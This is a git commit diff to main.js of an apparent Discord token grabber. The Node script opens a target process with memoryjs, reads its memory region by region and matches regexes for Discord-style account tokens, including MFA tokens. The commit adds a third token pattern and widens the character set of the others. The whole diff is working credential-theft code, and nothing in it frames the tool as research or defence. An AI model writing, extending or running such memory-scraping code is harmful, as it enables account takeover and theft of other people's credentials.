3f835034854c894bcc447879034b7af27e903ddc
stanlee786 <um3ra101@gmail.com>
2022-05-22 15:51:41 +0200

    Added new regexes

--- main.js
+++ main.js
@@ -5,8 +5,9 @@ const processes = memoryjs.getProcesses();
 
 let token = "";
 
-let normal = new RegExp(/ODk[a-zA-Z0-9]{21}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9]{38}/g)
-let mfa = new RegExp(/ODk[a-zA-Z0-9]{21}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9]{107}/g)
+let firstCheck = new RegExp(/ODk[a-zA-Z0-9]{21}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9-_]{38}/g);
+let secondCheck = new RegExp(/ODk[a-zA-Z0-9]{21}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9-_]{107}/g);
+let thirdCheck = new RegExp(/Nz[a-zA-Z0-9]{22}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9-_]{38}/g);
 
 let procID = 0;
 let found = false;
@@ -24,25 +25,29 @@ for (let i = 0; i < processes.length; i++) {
 console.log("getting process handle and base adres...");
 const processObject = memoryjs.openProcess(procID);
 console.log("succesfully retrieved handle " + processObject.handle + " and base adres " + processObject.modBaseAddr);
-console.log("finding token in memory...")
+console.log("searching token in memory...")
 
 let addr = 0;
 while (true) {
     try {
         let query = memoryjs.virtualQueryEx(processObject.handle, addr);
         let string = memoryjs.readBuffer(processObject.handle, addr, query.RegionSize).toString();
-        let ntoken = normal.exec(string);
-        let mtoken = mfa.exec(string);
 
-        if (ntoken) {
-            token = ntoken[0];
-        } else if (mtoken) {
-            token = mtoken[0];
+        let fToken = firstCheck.exec(string);
+        let sToken = secondCheck.exec(string);
+        let tToken = thirdCheck.exec(string);
+
+        if (fToken) {
+            token = fToken[0];
+        } else if (sToken) {
+            token = sToken[0];
+        } else if (tToken) {
+            token = tToken[0];
         };
 
         addr = query.BaseAddress + query.RegionSize;
     } catch (err) {
-        console.log("succesfully retrieved token");
+        console.log("succesfully found token");
         break;
     };
 };
